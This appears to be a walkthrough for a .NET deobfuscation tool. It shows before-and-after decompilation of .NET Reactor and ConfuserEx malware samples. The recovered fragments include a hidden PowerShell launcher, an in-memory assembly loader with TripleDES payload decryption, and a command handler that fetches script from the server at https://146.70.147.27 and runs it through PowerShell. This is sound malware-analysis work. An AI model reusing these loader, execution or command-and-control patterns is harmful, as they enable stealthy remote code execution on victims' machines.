# Protection removal: before and after

A protected assembly can hide a PowerShell launcher behind an empty-looking method, or disguise an in-memory payload load as a call to an unknown helper. This walkthrough shows what becomes visible after recovering real .NET Reactor and ConfuserEx malware samples.

Each example starts with the obstacle and ends with the code or artifact an analyst can investigate. **Final C#** comes from ILSpy decompilation of a written output; `...` marks omitted code.

## .NET Reactor

### 1. An empty-looking method becomes a hidden PowerShell launcher

**Sample:** `Qafcakg.payload.Ptnifif.dll`

Reactor's **method-body encryption** keeps the real CIL instructions encrypted and leaves a stub in their place. A decompiler sees the stub rather than the process-launching code. Decrypting the body restores the instructions; resolving its encrypted strings then reveals the executable name. In the original file, the launcher looks like this:

**Before**

```cil
IL_0000: nop
IL_0001: nop
IL_0002: nop
IL_0003: ret
```

There is no visible process creation, executable name or command line to investigate.

**Final C#**

```csharp
ProcessStartInfo processStartInfo = new ProcessStartInfo();
...
processStartInfo.FileName = "powershell.exe";
processStartInfo.Arguments = P_0;
processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
processStartInfo.CreateNoWindow = true;
processStartInfo.UseShellExecute = false;
Process.Start(processStartInfo);
```

The recovered method starts `powershell.exe` with a command line supplied by its caller (`P_0`) and hides the window. The next step is to inspect its callers to find the commands being passed in.

Recovery restored 313 encrypted method bodies and resolved 152 string references in this payload.

### 2. Indirect calls and encrypted strings become an in-memory loading chain

**Sample:** `Qbjuef.exe`

Reactor's **reference proxies** replace recognizable framework calls with calls through obfuscated helpers and delegate fields. The loader still passes around payload bytes, but the call site no longer tells the analyst that those bytes go to `Assembly.Load`. Resolving the proxies restores the direct API calls. **String encryption** separately hides the type and method names used for reflection; decoding those strings reveals the next stage's entry point.

**Before: the assembly load is disguised as a helper call**

```cil
IL_006B: ldarg.0
IL_006C: ldfld System.Byte[] QhbqOJN0Fee3C4K5k5.UIvLjIkIS82qklD7Gw::bDSuRNVn1
IL_0071: ldsfld MuX4cvhmWNhAwWvDSS2 MuX4cvhmWNhAwWvDSS2::BXPho3ZLdq
IL_0076: call System.Reflection.Assembly MuX4cvhmWNhAwWvDSS2::sDYhFaFubx(System.Byte[],MuX4cvhmWNhAwWvDSS2)
```

**Before: reflection names come from a string decoder**

```cil
IL_0089: call System.String StringDecoder::VenS25X1DV(System.Int32)
...
IL_00A8: call System.String StringDecoder::VenS25X1DV(System.Int32)
```

`StringDecoder` is a display alias for the sample's obfuscated string helper.

**Final C#**

```csharp
Assembly assembly = Assembly.Load(byteArrayField_0000);
string name = "C1suCN5KK3yRESlsiP.eYE95NCJJsOvlnZmJA";
Type type = assembly.GetType(name);
string name2 = "LXhc61f9Z";
type.GetMethod(name2).Invoke(null, null);
```

The loader passes its byte array directly to `Assembly.Load`, finds a specific type, then invokes `LXhc61f9Z`. This gives the analyst a concrete handoff to follow in the next stage, without needing a dropped executable on disk.

Across the sample, 1,230 proxy calls become direct calls. Control-flow cleanup also removes the dispatch loop around this loading sequence. The VM-backed string-resolution machinery is removed after its strings have been recovered, leaving the loading chain above readable.

### 3. Payload decryption and recovered files reveal the next stage

**Sample:** `Qbjuef.exe`

The loading chain raises the next question: where do its bytes come from? **Encrypted resources and embedded stages** keep useful content out of the form an analyst can open directly. Resource recovery decodes the protected container, while capturing the bytes supplied to an in-memory assembly load produces a separate DLL to inspect. In this sample, resolving indirect calls also makes the malware's own TripleDES payload decryptor readable; that decryptor is application logic to investigate, rather than protector code to discard.

**Final C#: the payload decryptor**

```csharp
TripleDES tripleDES = TripleDES.Create();
...
CryptoStream cryptoStream = new CryptoStream(memoryStream, ((SymmetricAlgorithm)tripleDES).CreateDecryptor(), CryptoStreamMode.Write);
...
((Stream)cryptoStream).Write(buffer, 0, count);
cryptoStream.FlushFinalBlock();
...
byteArrayField_0000 = memoryStream.ToArray();
```

The recovered routine uses TripleDES in CBC mode with PKCS7 padding, then stores the decrypted bytes in the field used by the loading chain. The application decryptor remains available to inspect.

The run also produces two useful artifacts:

| Recovered artifact | What to investigate |
| --- | --- |
| Decoded resource assembly, 52,224 bytes | The restored `Qbjuef.g.resources` and `Iihysdqnl.Properties.Resources.resources` streams |
| `Zebekeadu.dll`, 92,672 bytes | A managed next stage captured from an in-memory assembly load; its resources include `Cdte` and `lVVE` |

Use the extracted DLL and the loader's reflection targets to continue the investigation. The report records each artifact's source and SHA-256 so the resource container and loaded stage can be tracked separately.

### 4. A native wrapper yields a managed assembly

**Sample:** `WindowsManagement.exe`

A **native wrapper** puts an extra layer around the managed program: the outer executable is native code, and the .NET assembly is stored as encrypted resource data. A .NET decompiler cannot show the hidden assembly's methods by opening the wrapper alone. Unpacking decodes that resource and extracts the managed assembly as a separate file, giving the analyst a new starting point for .NET analysis.

| Before | After |
| --- | --- |
| Native executable containing an 8,387,267-byte encrypted resource | Extracted `stub.exe`, a 14,724,608-byte managed assembly with 6,155 types |

The extracted assembly can now be opened in a .NET decompiler and analyzed as the next stage. This example ends at extraction.

## ConfuserEx

### 5. Encrypted bodies and constants reveal a PowerShell command handler

**Sample:** `confuser_06b9d08b33f2.dll`

ConfuserEx's **anti-tamper protection** encrypts the section containing method bodies, so a decompiler initially cannot read the command handler's instructions. Decrypting the section restores 242 method bodies. **Constant encryption** adds another obstacle: readable strings are replaced by numeric lookups into a decoder. Resolving those lookups exposes the command interpreter and network settings used by the recovered code.

**Before: even the interpreter name is a decoder call**

```cil
IL_0092: ldc.i4 1763100277
IL_0097: br.s IL_0099
IL_0099: call System.String <Module>::ConstantGetter<System.String>(System.UInt32)
```

**After: the string is visible**

```cil
IL_008E: nop
IL_008F: br.s IL_0091
IL_0091: ldstr "powershell"
```

**Final C#**

```csharp
ProcessStartInfo processStartInfo = new ProcessStartInfo("powershell");
processStartInfo.CreateNoWindow = true;
processStartInfo.RedirectStandardInput = true;
processStartInfo.UseShellExecute = false;
Process.Start(processStartInfo).StandardInput.WriteLine("$UUID='" + IgD2kDuq81HoiFA9fd0tVilj + "';" + Encoding.UTF8.GetString(array2) + ";exit");
```

The method starts PowerShell without a window and sends script text through standard input. It prefixes the script with a `$UUID` assignment and appends `;exit`. The script bytes (`array2`) come from the command-server response.

This connects recovered strings to actual execution logic: `powershell` is used to launch the interpreter, rather than appearing only as an isolated string.

### 6. Recovered network settings expose the command transport

**Sample:** the same ConfuserEx payload

**Constant encryption** hides protocol details by replacing literal values with calls to a decoder. Here, the HTTP method and timeout property names are concealed behind numeric lookup values, making the request harder to recognize at a glance. Decoding the constants puts values such as `POST`, `ReadWriteTimeout` and `Timeout` back into the code, where the analyst can connect them to the request and response handling.

**Before: the HTTP method is hidden**

```cil
IL_0052: ldc.i4 143575047
IL_0057: br.s IL_0059
IL_0059: call System.String <Module>::HttpConstantGetter<System.String>(System.UInt32)
```

**After**

```cil
IL_004E: nop
IL_004F: br.s IL_0051
IL_0051: ldstr "POST"
```

**Final C#**

```csharp
HttpWebRequest httpWebRequest = WebRequest.Create(P_0) as HttpWebRequest;
((N15azZvpDmkwFj_)(object)typeof(HttpWebRequest)).Type_GetProperty("Method").SetValue(httpWebRequest, "POST", null);
((N15azZvpDmkwFj_)(object)typeof(HttpWebRequest)).Type_GetProperty("ReadWriteTimeout").SetValue(httpWebRequest, (P_3 == -1) ? 600000 : P_3, null);
((N15azZvpDmkwFj_)(object)typeof(HttpWebRequest)).Type_GetProperty("Timeout").SetValue(httpWebRequest, (P_3 == -1) ? 600000 : P_3, null);
Stream requestStream = httpWebRequest.GetRequestStream();
byte[] array = BIno02tbMza4XbJOZl2YEh(P_1, P_2);
requestStream.Write(array, 0, array.Length);
WebResponse response = httpWebRequest.GetResponse();
Stream responseStream = response.GetResponseStream();
MemoryStream memoryStream = new MemoryStream();
responseStream.CopyTo(memoryStream);
return jwySUal8VGtaiT7ro0KtcbC_GlBDojRvXKtazPb_vd0VuYqwsSrsJOkR(memoryStream.ToArray(), P_2);
```

The helper creates an HTTP request, selects `POST`, writes an encoded request body, reads the response and passes the returned bytes through the sample's decoder. The command handler calls this helper with `https://146.70.147.27` and uses `"P"` and `"T"` markers in its request messages.

The endpoint, request markers, encoding routines and timeout values are now available for network analysis and detection work.

### 7. Control-flow unflattening reveals the command decisions

**Sample:** the same ConfuserEx command handler

ConfuserEx uses **control-flow flattening (CFF)** to hide the command handler's structure. Instead of ordinary branches, execution repeatedly returns to a dispatcher that uses an arithmetic state value to select the next block through a switch. Decrypting the method body exposes this dispatcher, but leaves the analyst tracing state changes to work out what happens next.

**Before**

```cil
IL_0000: nop
IL_0001: ldc.i4 -1437685091
IL_0006: ldc.i4 -1339542675
IL_000B: xor
IL_000C: dup
IL_000D: stloc.s V_9
IL_000F: ldc.i4.s 12
IL_0011: rem.un
IL_0012: switch (IL_010A, IL_012D, IL_0148, IL_00F5, IL_0062, IL_00BC, IL_0001, IL_009E, IL_0076, IL_004C, IL_015C, IL_00B1)
IL_0047: br IL_015C
```

**Final C#**

```csharp
if (array[0] == 202)
{
    uint num = (uint)(array[1] + (array[2] << 8) + (array[3] << 16) + (array[4] << 24));
    byte[] array2 = new byte[array.Length - 5];
    Buffer.BlockCopy(array, 5, array2, 0, array2.Length);
    Thread.Sleep(5000);
    ...
}
if (array[0] == 244)
{
    Environment.Exit(1);
}
```

The recovered branches show the protocol decisions directly:

- **202:** read a four-byte value, take the remaining response bytes as script content, wait five seconds, then enter the PowerShell path shown above.
- **244:** exit the process.

**CFF unflattening** resolves the dispatcher transitions and reconnects the code blocks into ordinary branches. In this method, all four dispatcher switches disappear, exposing the `202` and `244` response checks shown above. The analyst can now follow the command-handling logic directly instead of tracing the dispatcher's arithmetic state. Renamed helpers and removal of dead support methods also make the HTTP and command routines easier to navigate.

## Try it on a sample

Use a fresh case folder:

```powershell
.\cilantro.exe C:\cases\Qbjuef.exe -o C:\cases\qbjuef-review
```

Follow **OUTPUT** to the cleaned assembly, HTML report and extracted files. Open the original and cleaned assemblies side by side in ILSpy or dnSpyEx. Start with the suspicious behavior you are investigating, then follow its callers, decoded strings and extracted stages.

## Evidence and scope

These are static observations from recovered malware code: no sample was executed and no command server was contacted. The examples show specific recovered paths, rather than complete removal of every protection in each file.

Sample hashes, method identities, capture details and reproduction commands are in the [evidence appendix](assets/protection-removal-notes.md). The original captures use CILantro 1.0.0; the final PowerShell-launcher C# was captured with 1.0.1. See [support and limitations](compatibility.md) for broader coverage.
